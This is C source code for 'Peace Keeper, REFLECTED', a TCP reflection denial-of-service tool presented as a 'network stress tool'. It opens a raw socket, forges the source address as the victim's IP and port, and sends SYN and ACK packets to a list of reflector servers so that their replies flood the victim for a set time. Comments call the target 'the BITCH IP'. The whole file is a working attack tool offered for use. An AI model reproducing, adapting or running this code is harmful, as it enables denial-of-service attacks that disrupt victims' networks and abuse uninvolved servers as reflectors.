/*                   .ed"""" """$$$$be.                 FLAG LIST:       1 = FIN
                   -"           ^""**$$$e.                               2 = SYN
                 ."                   '$$$c                              3 = FIN+SYN
                /                      "4$$b                             4 = RST
               d  3                      $$$$                            5 = RST+FIN
               $  *                   .$$$$$$                            6 = RST+SYN
              .$  ^c           $$$$$e$$$$$$$$.                           7 = RST+SYN+FIN
              d$L  4.         4$$$$$$$$$$$$$$b                           8 = PUSH
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$                           9 = PUSH+FIN
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$                          10 = PUSH+SYN
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c              11 = PUSH+SYN+FIN
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.              12 = PUSH+RST
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$             13 = PUSH+RST+FIN
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""              14 = PUSH+RST+SYN
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"               15 = PUSH+RST+SYN+FIN
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"                     16 = ACK
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"                       17 = ACK+FIN
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"                          18 = ACK+SYN
                  "$   "%*ebJLzb$e$$$$$b $P"                            19 = ACK+SYN+FIN
                    %..      4$$$$$$$$$$ "                              20 = ACK+RST
                     $$$e   z$$$$$$$$$$%                                21 = ACK+RST+FIN
                      "*$c  "$$$$$$$P"                                  22 = ACK+RST+SYN
                       ."""*$$$$$$$$bc                                  23 = ACK+RST+SYN+FIN
                    .-"    .$***$$$"""*e.                               24 = ACK+PUSH
                 .-"    .e$"     "*$c  ^*b.                             25 = ACK+PUSH+FIN
          .=*""""    .e$*"          "*bc  "*$e..                        26 = ACK+PUSH+SYN
        .$"        .z*"               ^*$e.   "*****e.                  27 = ACK+PUSY+SYN+FIN
        $$ee$c   .d"                     "*$.        3.                 28 = ACK+PUSH+RST
        ^*$E")$..$"                         *   .ee==d%                 29 = ACK+PUSH+RST+FIN
           $.d$$$*                           *  J$$$e*                  30 = ACK+PUSH+RST+SYN
            """""                              "$$$"                    31 = ACK+PUSH+RST+SYN+FIN
                                                                        32 = URGENT
                                                                        63 = ACK+PUSH+RST+SYN+FIN+URG
Peace Keeper, REFLECTED: A TCP/IP IPv4 network stress tool.             64 = Randomized flags set in an array.
The traditional way of keeping the peace amongst the crowd.             65 = Digital Gangsta Stomper (special flags)
By darkness@efnet, greetz vae@efnet
Features:
    - RFC-793 Pseudo Header for TCP packet forgery.
    - Employs TCP reflection techniques on IPv4 networks.
    - Randomized TCP windows.
    - Randomized destination ports.
    - Randomized TCP flag capabilities.
    - Ephemeral port randomization.
    - TCP flag input parsed as binary, any flag combination will work.
    - Randomized TCP sequences.
    - Randomized TCP acknowledgements.
    - Randomized TTL or exact value via specification
    - Window scaling.
    - Randomized TSVal
    - Readable code that is properly indented.
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <stdbool.h>

#define PHI                           0xa31bc             // Number generation seed
#define STRINGLEN                     64                  // DONT TOUCH FGT
#define MAX_PACKET_LEN			      8192                // Max packet size.
#define IP_RF                         0x8000              // reserved fragment flag 
#define IP_DF                         0x4000              // dont fragment flag 
#define IP_MF                         0x2000              // more fragments flag 
#define IP_OFFMASK                    0x1fff              // mask for fragmenting bits 
#define TCP_MODE_ACK                  1                   // Reflection mode 1 (ACK)
#define TCP_MODE_SYN                  2                   // Reflection mode 2 (SYN)
#define TCP_MODE_ACKSYN               3                   // Reflection mode 3 (ACK+SYN)
#define EPHEMERAL_PORT_MIN            16383               // Min ephemeral TCP port randomization
#define EPHEMERAL_PORT_MAX            49152               // Max ephemeral TCP port randomization
#define RAND_PORT_MIN                 1                   // Min TCP port randomization
#define RAND_PORT_MAX                 65534               // Max TCP port randomization
#define TCP_WINDOW_SIZE_MIN           1                   // Min TCP window size.
#define TCP_WINDOW_SIZE_MAX           65534               // Max TCP window size.
#define TCP_TTL_MIN                   1                   // Min TCP TTL length
#define TCP_TTL_MAX                   255                 // Max TCP TTL length
#define TCP_DATA_LEN_MIN              0                   // Min TCP data length
#define TCP_DATA_LEN_MAX              1024                // Max TCP data length

char datagram[MAX_PACKET_LEN] = { 0 };
static uint32_t Q[4096], c = 78512212;
unsigned int start = 0;
unsigned int reflectorAddr = 0;
unsigned short reflectorPort = 0;
unsigned int pktcount = 0, pktsent = 0;
unsigned long long int packets = 0;
unsigned int server_count = 0;
int rawsock = 0;

struct ip
{
    unsigned int ip_hl : 4;              // header length 
    unsigned int ip_v : 4;               // version 
    unsigned char ip_tos;                // type of service 
    unsigned short ip_len;               // total length 
    unsigned short ip_id;                // identification 
    unsigned short ip_off;               // fragment offset field 
    unsigned char ip_ttl;                // time to live 
    unsigned char ip_p;                  // protocol 
    unsigned short ip_sum;               // checksum 
    struct in_addr ip_src, ip_dst;       // source and dest address 
};

struct tcp
{
    unsigned short th_sport;        // source port
    unsigned short th_dport;        // destination port
    unsigned int th_seq;            // sequence number
    unsigned int th_ack;            // acknowledgement number
    unsigned char th_x2 : 4;        // (unused field) 
    unsigned char th_off : 4;       // TCP Offset
    unsigned char th_flags;         // flags
    unsigned short th_win;          // window
    unsigned short th_sum;          // checksum
    unsigned short th_urp;          // urgent pointer
};

struct reflector
{
    struct in_addr ip4_addr;
    unsigned short dport;
};

// Assemble our headers
struct ip* xf_iphdr = (struct ip*)datagram;
struct tcp* xf_tcphdr = (struct tcp*)(sizeof(struct ip) + datagram);
struct reflector* reflectors = NULL;

unsigned int lookup(char* hostname)
{
    struct hostent* name;
    unsigned int address;

    if ((address = inet_addr(hostname)) != -1)
        return address;
    if ((name = gethostbyname(hostname)) == NULL)
        return -1;

    memcpy(&address, name->h_addr, name->h_length);
    return address;
}

unsigned short csum(unsigned short* addr, int len)
{
    int nleft = len;
    unsigned int sum = 0;
    unsigned short* w = addr;
    unsigned short answer = 0;

    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
    {
        *(unsigned char*)(&answer) = *(unsigned char*)w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

void init_rand(uint32_t x)
{
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

void handle_exit()
{
    printf("-> Flood completed, %llu packets sent, %zu seconds, %llu packets/sec\n", packets, time(NULL) - start, packets / (time(NULL) - start));
    exit(0);
}

struct reflector* read_servers(char* filename)
{
    FILE* fp;
    uint32_t len = 0;
    uint32_t i;
    struct reflector* reflectors;
    char buffer[STRINGLEN];
    char input[2][STRINGLEN];
    char* p = NULL;

    if (!(fp = fopen(filename, "r")))
    {
        fprintf(stderr, "error: can't open file %s\n", filename);
        exit(-1);
    }

    len = 4096 * sizeof(struct reflector);
    reflectors = malloc(len);

    while (fgets(buffer, sizeof(buffer), fp))
    {
        if (server_count >= (len / sizeof(struct reflector)) - 2)
        {
            reflectors = realloc(reflectors, len + (4096 * sizeof(struct reflector)));
            len += 4096 * sizeof(struct reflector);
        }

        if (buffer[strlen(buffer) - 1] == '\n')
            buffer[strlen(buffer) - 1] = 0;

        input[0][0] = 0;
        input[1][0] = 0;
        p = NULL;

        for (i = 0; i < 2; i++)
        {
            if (!(p = strtok(p ? NULL : buffer, " ")))
                break;

            strncpy(input[i], p, sizeof(input[i]) - 1);
        }

        if (!input[1][0])
            continue;

        if ((reflectors[server_count].ip4_addr.s_addr = lookup(input[0])) == -1)
            continue;

        reflectors[server_count].dport = atoi(input[1]);
        server_count++;
    }
    printf("-> Loaded %u reflectors.\n", server_count);

    if (!server_count)
    {
        fprintf(stderr, "Error: 0 reflectors found!\n");
        exit(-1);
    }

    reflectors[server_count].dport = 0;
    return(reflectors);
}

void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsigned int ttime)
{
    struct sockaddr_in sin;
    unsigned int z = 1;

    // Iterate to a new reflector stored in our list.
    reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
    reflectorPort = htons(reflectors[z].dport);

    xf_iphdr->ip_dst.s_addr = reflectorAddr;
    xf_tcphdr->th_dport = reflectorPort;
    sin.sin_port = reflectorPort;
    sin.sin_family = AF_INET; // set socket family

    // The BITCH IP & PORT we're packeting.
    xf_iphdr->ip_src.s_addr = dest;
    xf_tcphdr->th_sport = htons(dstport);

    // Header shit
    xf_iphdr->ip_v = 4;
    xf_iphdr->ip_hl = 5;
    xf_iphdr->ip_tos = 0;
    xf_tcphdr->th_urp = 0;
    xf_iphdr->ip_id = htons(rand_cmwc());
    xf_iphdr->ip_off = htons(0x4000);
    xf_iphdr->ip_p = IPPROTO_TCP;

    // Set TCP options accordingly based on what kind of reflection attack we're doing.
    switch (mode)
    {
        case TCP_MODE_ACK:
        {
            xf_tcphdr->th_flags = 16;
            break;
        }
        case TCP_MODE_SYN:
        {
            xf_tcphdr->th_flags = 2;
            break;
        }
        case TCP_MODE_ACKSYN:
        {
            if (pktsent == 0)
            {
                xf_tcphdr->th_flags = 2;
            }
            else if (pktsent == 1)
            {
                xf_tcphdr->th_flags = 16;
            }
            break;
        }
    }

    // Set randomized SEQ and ACK
    xf_tcphdr->th_ack = htonl(rand_cmwc());
    xf_tcphdr->th_seq = htonl(rand_cmwc());

    // Randomize TCP source port.
    if (dstport == 0)
        xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));

    // Randomize TCP window.
    //xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
    // No, set it to 8192 instead.
    xf_tcphdr->th_win = htons(8192);

    // larger ttls are also more evil 
    xf_iphdr->ip_ttl = TCP_TTL_MAX;

    // Calculate TCP offset.
    xf_tcphdr->th_off = (sizeof(struct tcp)) / 4;

    // Calculate IP length
    xf_iphdr->ip_len = (sizeof(struct ip) + sizeof(struct tcp));
    xf_iphdr->ip_off = htons(0x4000);

    // Calculate TCP checksum
    xf_tcphdr->th_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
    xf_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));

    printf("-> TCP Packet Size: %zu\n", (sizeof(struct ip) + sizeof(struct tcp)));

    while (true)
    {
        // Restart from the beginning if we need to.
        if (z >= server_count)
        {
            z = 1;
            pktsent = 0;
        }

        // Have we reached our packet time yet?
        if (time(NULL) - start >= ttime)
        {
            handle_exit();
        }

        // Logic for packets per host.
        if (pktsent >= pktcount)
        {
            reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
            reflectorPort = htons(reflectors[z].dport);
            pktsent = 0;
            z++;
        }

        // Set destination address and port.
        xf_iphdr->ip_dst.s_addr = htonl(reflectorAddr);
        sin.sin_addr.s_addr = htonl(reflectorAddr);
        xf_tcphdr->th_dport = reflectorPort;
        sin.sin_port = reflectorPort;

        // Set TCP options accordingly based on what kind of reflection attack we're doing.
        switch (mode)
        {
            case TCP_MODE_ACK:
            {
                xf_tcphdr->th_flags = 16;
                break;
            }
            case TCP_MODE_SYN:
            {
                xf_tcphdr->th_flags = 2;
                break;
            }
            case TCP_MODE_ACKSYN:
            {
                if (pktsent == 0)
                {
                    xf_tcphdr->th_flags = 2;
                }
                else if (pktsent == 1)
                {
                    xf_tcphdr->th_flags = 16;
                }
                break;
            }
        }

        // Set randomized IP ID
        xf_iphdr->ip_id = htons(rand_cmwc());

        // Set randomized SEQ and ACK
        xf_tcphdr->th_ack = htonl(rand_cmwc());
        xf_tcphdr->th_seq = htonl(rand_cmwc());

        // Randomize TCP source port.
        if (dstport == 0)
            xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));

        // Calculate TCP checksum
        xf_tcphdr->th_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
        xf_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));

        // Send the packet to the victim(s).
        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcp), 0, (struct sockaddr*)&sin, sizeof(sin));
        packets++, pktsent++;
    }
}

int main(int argc, char** argv)
{
    unsigned int dest, ttime, mode;
    unsigned short dstport, srcport, winsize;
    char* listName;
    int tmp = 1;
    const int* val = &tmp;

    // Seed number randomization features.
    init_rand(time(NULL));

    // Parse arguments
    if (argv[1] == NULL || !strcmp(argv[1], "") || strcmp(argv[1], "29A"))
    {
        printf("-> Ah ah ah! You didn't say the magic word, deleting system file!\n");
        exit(0);
    }
    else
    {
        if (argc < 7)
        {
            printf("-> The supreme art of war is to subdue the enemy without fighting. - Peace Keeper, REFLECTED.\n");
            printf("USAGE : %s <key> <pkts-per-reflector> <dest> <destport> <list> <mode (1-3)> <time>\n", argv[0]);
            exit(0);
        }
    }

    // Allocate the socket
    rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (rawsock <= 0)
    {
        printf("Error opening raw socket\n");
        exit(-1);
    }
   
    // Set socket information
    if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        printf("setsockopt(): cannot set HDRINCL, die.\n");
        exit(-1);
    }

    // Parse input
    pktcount = atoi(argv[2]);
    dest = lookup(argv[3]);
    dstport = atoi(argv[4]);
    listName = argv[5];
    mode = atoi(argv[6]);
    ttime = atoi(argv[7]);

    // Read list pl0x
    reflectors = read_servers(listName);

    // Sanity checking for reflectors.
    if(pktcount >= 16)
    {
        printf("ERROR: packets per reflector too high (1-15)\n");
        exit(-1);
    }
    // Sanity cecking for port
    if(dstport < 0 || dstport > 65535)
    {
        printf("-> Acceptable TCP destination ports are between 1 and 65535.\n");
        exit(-1);
    }

    // Alert the user of what is taking place.
    if (dstport == 0)
        printf("-> Source Port Randomization [✔️] \n");

    switch (mode)
    {
        case TCP_MODE_ACK: printf("-> TCP Flag(s): ACK\n"); break;
        case TCP_MODE_SYN: printf("-> TCP Flag(s): SYN\n"); break;
        case TCP_MODE_ACKSYN: printf("-> TCP Flag(s): ACK+SYN\n"); pktcount = 2; break;
        default:
        {
            printf("ERROR: Unknown mode, exit\n");
            exit(-1);
        }
    }

    // Set signals
    signal(SIGINT, handle_exit);
    signal(SIGTERM, handle_exit);
    signal(SIGQUIT, handle_exit);

    // Call attack function
    start = time(NULL);
    attack(dest, dstport, mode, ttime);
}
